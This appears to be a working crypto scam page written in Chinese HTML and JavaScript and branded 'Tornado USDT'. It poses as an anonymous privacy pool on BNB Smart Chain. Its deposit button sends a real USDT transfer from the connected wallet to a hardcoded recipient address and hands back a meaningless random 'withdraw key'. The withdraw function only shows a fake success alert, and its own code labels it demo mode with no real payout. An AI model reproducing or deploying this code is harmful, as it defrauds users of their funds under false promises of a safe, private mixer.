<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>Tornado USDT | 隐私池子</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Inter', "PingFang SC", "Microsoft YaHei", sans-serif}
body{background:#0f1419;color:#e0e0e0;padding:25px 15px}
.main{max-width:460px;margin:40px auto;background:#171b24;border-radius:20px;border:1px solid #2a303e;overflow:hidden}
.header{padding:30px 24px 20px;text-align:center}
.header h1{font-size:24px;color:#ffffff;margin-bottom:6px}
.header .sub{font-size:13px;color:#8a91a0}
.header .balance{font-size:12px;color:#7a8292;margin-top:8px}
.wallet-box{display:flex;justify-content:space-between;align-items:center;padding:14px 24px;background:#121720;border-bottom:1px solid #252b36}
#addr{font-size:14px;color:#c5c9d3}
#connectBtn{background:#1c71ed;color:white;border:none;padding:9px 16px;border-radius:10px;font-weight:600;font-size:14px;cursor:pointer}
.tab-group{display:flex;padding:0 24px;gap:12px;margin-top:10px}
.tab{flex:1;padding:14px;text-align:center;background:#1c212c;border:none;color:#99a0b0;border-radius:12px;font-size:15px;cursor:pointer}
.tab.active{background:#1c71ed;color:white}
.panel{padding:24px;display:none}
.panel.active{display:block}
.form-item{margin-bottom:20px}
.form-item label{display:block;margin-bottom:8px;font-size:14px;color:#d0d5e0}
input{width:100%;padding:15px;background:#121720;border:1px solid #2a303e;border-radius:12px;color:white;font-size:15px;outline:none}
.amount-group{display:flex;gap:8px;margin-bottom:16px}
.amount-btn{flex:1;padding:10px;background:#1c212c;border:1px solid #2a303e;color:#c5c9d3;border-radius:10px;font-size:14px;cursor:pointer}
.amount-btn:hover{border-color:#1c71ed;color:#fff}
.key-box{padding:14px;background:#1c212c;border:1px solid #2a303e;border-radius:12px;font-family:monospace;font-size:14px;color:#fff;word-break:break-all}
.submit-btn{width:100%;padding:17px;background:#1c71ed;color:white;border:none;border-radius:12px;font-size:16px;font-weight:bold;margin-top:10px;cursor:pointer}
.submit-btn:hover{opacity:0.92}
</style>
</head>
<body>

<div class="main">
  <div class="header">
    <h1>Tornado USDT</h1>
    <div class="sub">匿名隐私交易池子 · 安全上链</div>
    <div class="balance" id="balance">钱包余额：0.0000 USDT</div>
  </div>

  <div class="wallet-box">
    <div id="addr">未连接钱包</div>
    <button id="connectBtn">连接钱包</button>
  </div>

  <div class="tab-group">
    <button class="tab active" data-target="deposit">匿名存入</button>
    <button class="tab" data-target="withdraw">隐私提取</button>
  </div>

  <div id="deposit" class="panel active">
    <div class="form-item">
      <label>存入数量（USDT）</label>
      <div class="amount-group">
        <div class="amount-btn" data-val="100">100</div>
        <div class="amount-btn" data-val="500">500</div>
        <div class="amount-btn" data-val="2000">2000</div>
      </div>
      <input id="amount" type="text" placeholder="自定义数量" value="0.1">
    </div>
    <button class="submit-btn" id="depositBtn">确认存入</button>

    <div id="keyArea" style="display:none;margin-top:20px">
      <div class="form-item">
        <label style="color:#22c55e">✅ 存入成功！请保存提取密钥</label>
        <div class="key-box" id="withdrawKey"></div>
      </div>
    </div>
  </div>

  <div id="withdraw" class="panel">
    <div class="form-item">
      <label>提取到钱包地址</label>
      <input id="toAddr" type="text" placeholder="0x...">
    </div>
    <div class="form-item">
      <label>提取数量（USDT）</label>
      <input id="withdrawAmount" type="text" placeholder="输入提取数量">
    </div>
    <div class="form-item">
      <label>输入提取密钥</label>
      <input id="userKey" type="text" placeholder="请输入您的提取密钥">
    </div>
    <button class="submit-btn" id="doWithdraw">确认提取</button>
  </div>
</div>

<script>
// 切换面板
document.querySelectorAll('.tab').forEach(tab => {
  tab.onclick = () => {
    document.querySelectorAll('.tab,.panel').forEach(e => e.classList.remove('active'))
    tab.classList.add('active')
    document.getElementById(tab.dataset.target).classList.add('active')
  }
})

// 快捷金额
document.querySelectorAll('.amount-btn').forEach(btn => {
  btn.onclick = () => {
    document.getElementById('amount').value = btn.dataset.val
  }
})

// 配置信息
const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955"
const YOUR_ADDRESS = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"

let currentAccount = null
let savedKey = ''
const connectBtn = document.getElementById('connectBtn')
const addrText = document.getElementById('addr')
const balanceText = document.getElementById('balance')

// 工具函数：地址补全为64位十六进制
function padAddress(addr) {
  return addr.slice(2).padStart(64, '0')
}

// 工具函数：数量转18位小数十六进制
function toWeiHex(amount) {
  const wei = BigInt(Math.round(Number(amount) * 1e18))
  return wei.toString(16).padStart(64, '0')
}

// 连接钱包 + 切换 BSC
connectBtn.onclick = async () => {
  if (!window.ethereum) return alert('请在 MetaMask / TP 钱包内打开')
  try {
    await window.ethereum.request({
      method: 'wallet_addEthereumChain',
      params: [{
        chainId: '0x38',
        chainName: 'BNB Smart Chain',
        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
        rpcUrls: ['https://bsc-dataseed.binance.org/'],
        blockExplorerUrls: ['https://bscscan.com']
      }]
    })

    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' })
    currentAccount = accounts[0]
    addrText.innerText = currentAccount.slice(0,6)+'...'+currentAccount.slice(-4)
    connectBtn.innerText = '已连接'
    connectBtn.style.background = '#10b981'
    getUSDTBalance(currentAccount)
  } catch (err) {
    alert('连接取消或失败')
  }
}

// 获取 USDT 余额（原生 eth_call）
async function getUSDTBalance(address) {
  try {
    const data = '0x70a08231' + padAddress(address)
    const result = await window.ethereum.request({
      method: 'eth_call',
      params: [{ to: USDT_CONTRACT, data: data }, 'latest']
    })
    const balance = BigInt(result)
    const usdt = Number(balance) / 1e18
    balanceText.innerText = `钱包余额：${usdt.toFixed(4)} USDT`
  } catch(e) {
    balanceText.innerText = `钱包余额：获取失败`
  }
}

// 生成提取密钥
function generateKey(){
  const chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
  let key = ''
  for(let i=0;i<32;i++) key += chars[Math.floor(Math.random()*chars.length)]
  return key
}

// 真实 USDT 转账（原生 eth_sendTransaction）
document.getElementById('depositBtn').onclick = async () => {
  if(!currentAccount) return alert('请先连接钱包')
  const val = document.getElementById('amount').value
  if(!val||isNaN(val)||Number(val)<=0) return alert('请输入有效数量')

  try {
    const data = '0xa9059cbb' + padAddress(YOUR_ADDRESS) + toWeiHex(val)
    const tx = await window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [{
        from: currentAccount,
        to: USDT_CONTRACT,
        data: data,
        gas: '0x5B8D80'
      }]
    })

    savedKey = generateKey()
    document.getElementById('keyArea').style.display = 'block'
    document.getElementById('withdrawKey').innerText = savedKey

    alert(`存入成功！\n交易哈希：${tx}\n\n请复制保存您的提取密钥`)
    getUSDTBalance(currentAccount)
  } catch(e){
    alert('交易取消或失败：'+e.message)
  }
}

// 提取演示
document.getElementById('doWithdraw').onclick = () => {
  const key = document.getElementById('userKey').value.trim()
  const addr = document.getElementById('toAddr').value.trim()
  const amt = document.getElementById('withdrawAmount').value

  if(!addr) return alert('请输入接收地址')
  if(!amt||isNaN(amt)||Number(amt)<=0) return alert('请输入有效数量')
  if(!key) return alert('请输入提取密钥')
  if(key !== savedKey) return alert('提取密钥错误！')

  alert(`密钥正确！\n已向地址：${addr}\n发起提现：${amt} USDT\n（演示模式，无真实到账）`)
}
</script>
</body>
</html>
